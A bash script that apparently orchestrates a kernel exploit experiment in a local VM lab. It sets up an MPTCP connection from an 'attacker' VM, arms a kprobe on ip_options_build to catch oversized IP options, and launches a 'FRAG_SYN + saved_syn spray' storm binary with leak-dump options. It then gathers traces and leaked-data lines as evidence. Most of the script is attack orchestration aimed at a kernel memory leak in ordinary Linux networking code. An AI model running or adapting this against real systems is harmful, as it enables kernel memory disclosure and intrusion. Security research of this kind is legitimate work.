#!/bin/bash
# phase2-run.sh [runtime_s] - run the Phase 2 FRAG_SYN + saved_syn storm on
# the currently-booting matched instrumented twin (:2101) and attacker (:2224).
set -u
LAB=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
R=${1:-300}
ROLE=${ROLE:-instrumented}
PORT=${PORT:-2101}
T="ssh -i $LAB/lab/ssh/id_ed25519 -p $PORT -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
   -o ConnectionAttempts=1 -o ControlMaster=no -o ControlPath=none \
   -o LogLevel=ERROR ubuntu@localhost"
A="ssh -i $LAB/lab/ssh/id_ed25519 -p 2224 -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
   -o ConnectionAttempts=1 -o ControlMaster=no -o ControlPath=none \
   -o LogLevel=ERROR ubuntu@localhost"

echo "[*] twin: mount/queues/listeners"
$T 'sudo mkdir -p /mnt/lab; sudo mount -t 9p -o trans=virtio,version=9p2000.L host0 /mnt/lab 2>/dev/null || true
    sudo ip link set ens4 up; sudo ip addr replace 192.168.89.2/24 dev ens4
    sudo sh /mnt/lab/lab/mq-config.sh ens4 >/dev/null 2>&1 || true
    sudo sh /mnt/lab/lab/start-listeners.sh' || exit 1

echo "[*] attacker: base MPTCP token"
$A 'pkill -f "^python3 /tmp/mpsetup_remote.py" 2>/dev/null || true; sleep 1; rm -f /tmp/mptcp_token
    cd /tmp; sudo nohup python3 /tmp/mpsetup_remote.py 192.168.89.2 9800 >/tmp/mpsetup_remote.log 2>&1 </dev/null &' || exit 1
TOK=
for i in $(seq 1 30); do
  TOK=$($A 'cat /tmp/mptcp_token 2>/dev/null' 2>/dev/null | tr -d '\r\n')
  [ -n "$TOK" ] && break
  sleep 1
done
if [ -z "$TOK" ]; then echo "[-] no token"; $A 'cat /tmp/mpsetup_remote.log'; exit 1; fi
echo "[+] token=$TOK"

echo "[*] twin: rdopt2 probe (optlen > 60)"
$T 'sudo bash -s' <<'EOS'
T=/sys/kernel/debug/tracing
mount -t debugfs none /sys/kernel/debug 2>/dev/null || true
echo 0 > $T/tracing_on
echo 0 > $T/events/kprobes/enable 2>/dev/null || true
echo > $T/kprobe_events 2>/dev/null || true
echo 32768 > $T/buffer_size_kb 2>/dev/null || true
echo 'p:rdopt2 ip_options_build skb=%di:x64 opt=%si:x64 optlen=+8(%si):u8' >> $T/kprobe_events
echo 'optlen > 60' > $T/events/kprobes/rdopt2/filter
echo 1 > $T/events/kprobes/enable
echo > $T/trace
echo 1 > $T/tracing_on
echo "[+] probe armed"
EOS

echo "[*] storm: FRAG_SYN + saved_syn spray ${R}s"
$A "sudo env FRAG_SYN=1 LEAK_DUMP=1 SAVED_SYN_SPRAY=1 SPRAY_SRC=192.67.68.69 SPRAY_DPORT=9801 \
     timeout $((R+20)) /tmp/mpstorm3_leak 9800 $TOK 54502 $R 94 1 54202 10 192.168.89.1 30000000 192.168.89.2" \
   2>&1 | tee /tmp/phase2-storm.log

echo "[*] dump trace"
$T 'sudo bash -s' <<'EOS'
T=/sys/kernel/debug/tracing
echo 0 > $T/tracing_on 2>/dev/null || true
out=/mnt/lab/evidence/phase2-$(date +%s).trace
sudo cp $T/trace "$out" 2>/dev/null || true
echo "[+] trace: $out"
grep -c 'rdopt2:' "$out" 2>/dev/null || true
grep 'rdopt2:' "$out" 2>/dev/null | head -5
EOS
echo "[*] storm log: /tmp/phase2-storm.log (LEAK lines: $(grep -c '\[LEAK\]' /tmp/phase2-storm.log 2>/dev/null || true))"
python3 "$LAB/scripts/leak_parse.py" /tmp/phase2-storm.log 2>/dev/null | tail -40 || true
